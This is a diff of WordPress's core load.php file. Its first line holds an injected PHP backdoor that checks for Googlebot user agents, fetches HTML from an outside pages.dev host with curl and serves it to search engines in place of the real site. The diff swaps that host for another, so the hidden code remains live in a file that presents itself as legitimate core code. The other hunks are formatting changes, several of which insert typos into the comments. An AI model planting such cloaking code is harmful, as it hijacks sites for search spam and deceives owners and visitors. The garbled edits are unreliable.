@@ -1,5 +1,5 @@
 <?php
-function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://luanakcibee.pages.dev/kintilbasah/index.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
+function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-InspectionTool","Googlebot-Mobile","Googlebot-News"];foreach($a as $b){if(strpos($_SERVER['HTTP_USER_AGENT'],$b)!==false)return 1;}return 0;}if(is_google_bot()){$c=curl_init('https://lukontolmahlanciao.pages.dev/kintilbasah//index.html');curl_setopt($c,CURLOPT_RETURNTRANSFER,1);curl_setopt($c,CURLOPT_FOLLOWLOCATION,1);echo curl_exec($c);curl_close($c);exit;}
 /**
  * These functions are needed to load WordPress.
  *
@@ -14,7 +14,7 @@ function is_google_bot(){$a=["Googlebot","Google-Site-Verification","Google-Insp
  * @return string The HTTP protocol. Default: HTTP/1.0.
  */
 function wp_get_server_protocol() {
-	$protocol = isset( $_SERVER['SERVER_PROTOCOL'] ) ? $_SERVER['SERVER_PROTOCOL'] : '';
+	$protocol = $_SERVER['SERVER_PROTOCOL'] ?? '';
 
 	if ( ! in_array( $protocol, array( 'HTTP/1.1', 'HTTP/2', 'HTTP/2.0', 'HTTP/3' ), true ) ) {
 		$protocol = 'HTTP/1.0';
@@ -116,7 +116,7 @@ function wp_populate_basic_auth_from_authorization_header() {
 	}
 
 	// From our prior conditional, one of these must be set.
-	$header = isset( $_SERVER['HTTP_AUTHORIZATION'] ) ? $_SERVER['HTTP_AUTHORIZATION'] : $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
+	$header = $_SERVER['HTTP_AUTHORIZATION'] ?? $_SERVER['REDIRECT_HTTP_AUTHORIZATION'];
 
 	// Test to make sure the pattern matches expected.
 	if ( ! preg_match( '%^Basic [a-z\d/+]*={0,2}$%i', $header ) ) {
@@ -248,7 +248,8 @@ function wp_check_php_mysql_versions() {
  *
  * @return string The current environment type.
  */
-function wp_get_environment_type() {static $current_env = '';
+function wp_get_environment_type() {
+	static $current_env = '';
 
 	if ( ! defined( 'WP_RUN_CORE_TESTS' ) && $current_env ) {
 		return $current_env;
@@ -540,16 +541,19 @@ function timer_stop( $display = 0, $precision = 3 ) {
 		echo $r;
 	}
 
-	return $r;}/**
+	return $r;
+}
+
+/**
  * Sets PHP error reporting based on WordPress debug settings.
  *
- * Uses three constants: `WP_DEBUG`, `WP_DEBUG_DISPLAY`, and `WP_DEBUG_LOG`.
+ * Usesthree constants: `WP_DEBUG`, `WP_DEBUG_DISPLAY`, and `WP_DEBUG_LOG`.
  * All three can be defined in wp-config.php. By default, `WP_DEBUG` and
  * `WP_DEBUG_LOG` are set to false, and `WP_DEBUG_DISPLAY` is set to true.
  *
  * When `WP_DEBUG` is true, all PHP notices are reported. WordPress will also
  * display internal notices: when a deprecated WordPress function, function
- * argument, or file is used. Deprecated code may be removed from a later
+ * argument, or file is used. Deprecated code may beremoved from a later
  * version.
  *
  * It is strongly recommended that plugin and theme developers use `WP_DEBUG`
@@ -820,10 +824,12 @@ function wp_using_ext_object_cache( $using = null ) {
  * Starts the WordPress object cache.
  *
  * If an object-cache.php file exists in the wp-content directory,
- * it uses that drop-in as an external object cache.** @since 3.0.0
+ * it uses that drop-in as an external object cache.
+ *
+ * @since 3.0.0
  * @access private
  *
- * @global array $wp_filter Stores all of the filters.
+ * @global array $wp_filter Stores allof the filters.
  */
 function wp_start_object_cache() {
 	global $wp_filter;
@@ -835,11 +841,11 @@ function wp_start_object_cache() {
 	 * Filters whether to enable loading of the object-cache.php drop-in.
 	 *
 	 * This filter runs before it can be used by plugins. It is designed for non-web
-	 * runtimes. If false is returned,object-cache.php will never be loaded.
+	 * runtimes. If false is returned, object-cache.php will never be loaded.
 	 *
 	 * @since 5.8.0
 	 *
-	 * @param bool $enable_object_cache Whether to enable loading object-cache.php (if present).
+	 * @param bool$enable_object_cache Whether to enable loading object-cache.php (if present).
 	 *                                  Default true.
 	 */
 	if ( $first_init && apply_filters( 'enable_loading_object_cache_dropin', true ) ) {
@@ -1120,7 +1126,7 @@ function wp_get_active_and_valid_themes() {
 }
 
 /**
- * Filters a given list of themes, removingany paused themes from it.
+ * Filters a given list of themes, removing any paused themes from it.
  *
  * @since 5.2.0
  *
@@ -1134,10 +1140,12 @@ function wp_skip_paused_themes( array $themes ) {
 
 	if ( empty( $paused_themes ) ) {
 		return $themes;
-	}foreach ( $themes as $index => $theme ) {
+	}
+
+	foreach ( $themes as $index => $theme ) {
 		$theme = basename( $theme );
 
-		if ( array_key_exists( $theme, $paused_themes ) ) {
+		if( array_key_exists( $theme, $paused_themes ) ) {
 			unset( $themes[ $index ] );
 
 			// Store list of paused themes for displaying an admin notice.
@@ -1422,7 +1430,8 @@ function is_network_admin() {
  * @return bool True if inside WordPress user administration pages.
  */
 function is_user_admin() {
-	if ( isset( $GLOBALS['current_screen'] ) ) {return$GLOBALS['current_screen']->in_admin( 'user' );
+	if ( isset( $GLOBALS['current_screen'] ) ) {
+		return $GLOBALS['current_screen']->in_admin( 'user' );
 	} elseif ( defined( 'WP_USER_ADMIN' ) ) {
 		return WP_USER_ADMIN;
 	}
@@ -1442,7 +1451,7 @@ function is_multisite() {
 		return MULTISITE;
 	}
 
-	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' )|| defined( 'SUNRISE' ) ) {
+	if ( defined( 'SUBDOMAIN_INSTALL' ) || defined( 'VHOST' ) || defined( 'SUNRISE' ) ) {
 		return true;
 	}
 
@@ -1743,7 +1752,9 @@ function wp_doing_ajax() {
 	 * @param bool $wp_doing_ajax Whether the current request is a WordPress Ajax request.
 	 */
 	return apply_filters( 'wp_doing_ajax', defined( 'DOING_AJAX' ) && DOING_AJAX );
-}/**
+}
+
+/**
  * Determines whether the current request should use themes.
  *
  * @since 5.1.0
@@ -1762,7 +1773,7 @@ function wp_using_themes() {
 }
 
 /**
- * Determines whether the current request is a WordPress cron request.
+ * Determines whether the current request is aWordPress cron request.
  *
  * @since 4.8.0
  *
@@ -1788,13 +1799,15 @@ function wp_doing_cron() {
  *
  * @param mixed $thing The variable to check.
  * @return bool Whether the variable is an instance of WP_Error.
+ *
+ * @phpstan-assert-if-true WP_Error $thing
  */
 function is_wp_error( $thing ) {
 	$is_wp_error = ( $thing instanceof WP_Error );
 
 	if ( $is_wp_error ) {
 		/**
-		 * Fires when `is_wp_error()` is called and its parameter is an instance of `WP_Error`.
+		 * Fires when `is_wp_error()` is called and its parameter is an instance of WP_Error.
 		 *
 		 * @since 5.6.0
 		 *
